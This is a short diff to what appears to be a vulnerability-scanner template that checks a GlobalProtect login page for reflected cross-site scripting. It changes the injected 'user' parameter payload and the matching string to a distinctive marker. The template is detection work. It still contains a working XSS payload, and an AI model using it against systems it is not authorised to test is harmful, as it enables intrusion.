@@ -8,8 +8,8 @@ info:
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/global-protect/login.esp?user=j%22;-alert(1)-%22x"
+      - '{{BaseURL}}/global-protect/login.esp?user=j%22;-alert(147+"G147")-%22x'
     matchers:
       - type: word
         words:
-          - 'alert(1)'
+          - '147G147'
